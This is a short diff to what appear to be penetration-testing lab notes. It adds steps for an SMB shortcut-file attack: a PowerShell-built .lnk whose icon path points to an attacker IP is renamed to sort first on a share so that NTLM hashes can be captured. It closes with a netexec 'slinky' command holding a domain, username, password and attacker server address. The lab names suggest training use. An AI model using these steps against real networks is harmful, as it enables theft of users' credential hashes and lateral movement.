@@ -211,4 +211,13 @@ $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
 $lnk.Description = "Test"
 $lnk.HotKey = "Ctrl+Alt+T"
 $lnk.Save()
+
+
+1. Just write whole command of powershell above in victum machine. make sure we have to put attacker ip in command
+2. rename the file with  @test to ~test
+3. put that file to smb share
+4. Always make sure file should come up with alphabetically up , it’s makes easy to capture hashes.
+
+
+netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149
 ```
